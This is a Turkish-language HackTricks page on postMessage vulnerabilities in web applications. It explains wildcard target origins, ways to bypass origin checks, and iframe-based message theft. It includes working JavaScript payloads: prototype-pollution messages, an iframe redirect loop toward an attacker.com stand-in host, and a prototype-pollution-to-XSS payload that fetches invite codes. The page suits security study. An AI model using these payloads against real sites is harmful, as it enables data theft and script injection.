# PostMessage Açıkları

## PostMessage Açıkları

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** Gönder

**PostMessage**, bir mesaj göndermek için aşağıdaki işlevi kullanır:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Not edin ki **targetOrigin** bir '\*' veya _https://company.com_ gibi bir URL olabilir.\
**İkinci senaryoda**, **mesaj yalnızca o domaine gönderilebilir** (pencere nesnesinin kökeni farklı olsa bile).\
Eğer **joker karakter** kullanılıyorsa, **mesajlar herhangi bir domaine gönderilebilir** ve Pencere nesnesinin kökenine gönderilecektir.

### iframe'e saldırma & **targetOrigin**'de joker karakter

[**bu raporda**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) açıklandığı gibi, **iframed** (hiçbir `X-Frame-Header` koruması yok) olabilen bir sayfa bulursanız ve bu sayfa **joker karakter** (\*) kullanarak **hassas** mesaj gönderiyorsa, **iframe**'in **kökenini** **değiştirebilir** ve **hassas** mesajı sizin kontrolünüzdeki bir domaine **sızdırabilirsiniz**.\
Eğer sayfa iframed olabiliyorsa ancak **targetOrigin** **bir URL'ye ayarlanmışsa ve joker karaktere değilse**, bu **numara çalışmaz**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener istismarı

**`addEventListener`** JS tarafından **`postMessages`** bekleyen fonksiyonu tanımlamak için kullanılan işlevdir.\
Aşağıdaki gibi bir kod kullanılacaktır:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Not edin ki bu durumda kodun **ilk yaptığı şey** **kaynağı kontrol etmek**. Bu, alınan bilgilerle **herhangi bir hassas işlem** yapılacaksa son derece **önemlidir** (örneğin bir şifre değiştirmek gibi). **Eğer kaynağı kontrol etmezse, saldırganlar kurbanların bu uç noktalara rastgele veri göndermesine** ve kurbanların şifrelerini değiştirmesine neden olabilir (bu örnekte).

### Sayım

Mevcut sayfadaki **olay dinleyicilerini bulmak** için şunları yapabilirsiniz:

- **JS kodunda** `window.addEventListener` ve `$(window).on` (_JQuery versiyonu_) için **arama yapın**
- Geliştirici araçları konsolunda **şunu çalıştırın**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- Tarayıcının geliştirici araçlarında _Elements --> Event Listeners_ kısmına **gidin**

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) veya [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) gibi bir **tarayıcı uzantısı** kullanın. Bu tarayıcı uzantıları **tüm mesajları yakalar** ve size gösterir.

### Kaynak kontrolü atlamaları

- **`event.isTrusted`** niteliği güvenli kabul edilir çünkü yalnızca gerçek kullanıcı eylemleri tarafından üretilen olaylar için `True` döner. Doğru bir şekilde uygulanırsa atlanması zor olsa da, güvenlik kontrollerindeki önemi dikkate değerdir.
- PostMessage olaylarında kaynak doğrulaması için **`indexOf()`** kullanımı atlamaya karşı hassas olabilir. Bu zayıflığı gösteren bir örnek:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`'ten **`search()`** metodu, düzenli ifadeler için tasarlanmıştır, dizeler için değil. Regexp dışında bir şey geçmek, regex'e örtük dönüşüme yol açar ve bu metodun potansiyel olarak güvensiz olmasına neden olur. Çünkü regex'te bir nokta (.) joker karakter olarak işlev görür ve özel olarak hazırlanmış alan adlarıyla doğrulamanın atlanmasına olanak tanır. Örneğin:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- `search()` ile benzer olan **`match()`** fonksiyonu, regex'i işler. Eğer regex yanlış yapılandırılmışsa, atlamaya karşı hassas olabilir.
- **`escapeHtml`** fonksiyonu, karakterleri kaçırarak girdileri temizlemek için tasarlanmıştır. Ancak, yeni bir kaçırılmış nesne oluşturmaz, mevcut nesnenin özelliklerini üzerine yazar. Bu davranış istismar edilebilir. Özellikle, bir nesne, kontrol edilen özelliği `hasOwnProperty`'yi tanımayacak şekilde manipüle edilebiliyorsa, `escapeHtml` beklenildiği gibi çalışmayacaktır. Bu aşağıdaki örneklerde gösterilmektedir:

- Beklenen Hata:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Kaçırma:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Bu zayıflık bağlamında, `File` nesnesi, yalnızca okunabilir `name` özelliği nedeniyle özellikle istismar edilebilir. Bu özellik, şablonlarda kullanıldığında `escapeHtml` fonksiyonu tarafından temizlenmez ve potansiyel güvenlik risklerine yol açar.

- JavaScript'teki `document.domain` özelliği, bir script tarafından alan adını kısaltmak için ayarlanabilir ve bu, aynı üst alan adı içinde daha gevşek bir aynı köken politikası uygulamasına olanak tanır.

### e.origin == window.origin atlaması

Bir **sandboxed iframe** içinde bir web sayfası gömüldüğünde %%%%%%, iframe'in kaynağının null olarak ayarlanacağını anlamak önemlidir. Bu, **sandbox nitelikleri** ve bunların güvenlik ve işlevsellik üzerindeki etkileriyle ilgili olarak özellikle önemlidir.

**`allow-popups`** niteliklerini belirterek, iframe içinden açılan herhangi bir açılır pencere, üst öğesinin sandbox kısıtlamalarını miras alır. Bu, **`allow-popups-to-escape-sandbox`** niteliği de dahil edilmediği sürece, açılır pencerenin kaynağının da `null` olarak ayarlandığı anlamına gelir ve bu, iframe'in kaynağıyla uyumlu hale gelir.

Sonuç olarak, bu koşullar altında bir açılır pencere açıldığında ve iframe'den açılır pencereye **`postMessage`** kullanılarak bir mesaj gönderildiğinde, hem gönderim hem de alım uçlarının kaynakları `null` olarak ayarlanır. Bu durum, **`e.origin == window.origin`** ifadesinin doğru olduğu bir senaryoya yol açar (`null == null`), çünkü hem iframe hem de açılır pencere `null` değerine sahip aynı kaynak değerini paylaşır.

Daha fazla bilgi için **okuyun**:

{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source atlaması

Mesajın, scriptin dinlediği aynı pencereden gelip gelmediğini kontrol etmek mümkündür (özellikle **Tarayıcı uzantılarından gelen İçerik Scriptleri** için mesajın aynı sayfadan gönderilip gönderilmediğini kontrol etmek ilginçtir):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Bir mesajın **`e.source`** değerini null yapmak için, **postMessage** gönderen ve **hemen silinen** bir **iframe** oluşturabilirsiniz.

Daha fazla bilgi için **şunu okuyun:**

{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header atlatma

Bu saldırıları gerçekleştirmek için ideal olarak **kurban web sayfasını** bir `iframe` içine alabilmeniz gerekir. Ancak `X-Frame-Header` gibi bazı başlıklar bu **davranışı** **engelleyebilir**.\
Bu senaryolarda, daha az gizli bir saldırı kullanmaya devam edebilirsiniz. Gü vulnerable web uygulamasına yeni bir sekme açabilir ve onunla iletişim kurabilirsiniz:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Çocuk iframe'ine gönderilen mesajı ana sayfayı engelleyerek çalmak

Aşağıdaki sayfada, **veriyi göndermeden önce** **ana** sayfayı **engelleyerek** bir **çocuk iframe**'ine gönderilen **hassas postmessage verisini** nasıl çalabileceğinizi görebilirsiniz ve verinin alınmadan önce **çocukta bir XSS** kullanarak **veriyi sızdırabilirsiniz**:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe konumunu değiştirerek mesajı çalmak

X-Frame-Header içermeyen bir web sayfasını iframe'leyebiliyorsanız ve bu sayfa başka bir iframe içeriyorsa, o **çocuk iframe'in konumunu** **değiştirebilirsiniz**, böylece eğer bir **wildcard** kullanılarak gönderilen bir **postmessage** alıyorsa, bir saldırgan o iframe'in **kaynağını** kendisinin **kontrol ettiği** bir sayfaya **değiştirebilir** ve mesajı **çalabilir**:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage ile Prototip Kirlenmesi ve/veya XSS

`postMessage` aracılığıyla gönderilen verilerin JS tarafından çalıştırıldığı senaryolarda, **sayfayı** **iframe**'leyebilir ve **prototip kirlenmesi/XSS**'yi **postMessage** aracılığıyla gönderilen istismar ile **istismar** edebilirsiniz.

**postMessage** aracılığıyla **çok iyi açıklanmış XSS örnekleri** [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html) adresinde bulunabilir.

Bir `iframe`'e **Prototip Kirlenmesi ve ardından XSS** istismarı için bir örnek:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Daha **fazla bilgi** için:

- [**prototip kirlenmesi**](../deserialization/nodejs-proto-prototype-pollution/) hakkında sayfaya bağlantı
- [**XSS**](../xss-cross-site-scripting/) hakkında sayfaya bağlantı
- [**istemci tarafı prototip kirlenmesi ile XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) hakkında sayfaya bağlantı

## Referanslar

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Pratik yapmak için: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

{{#include ../../banners/hacktricks-training.md}}
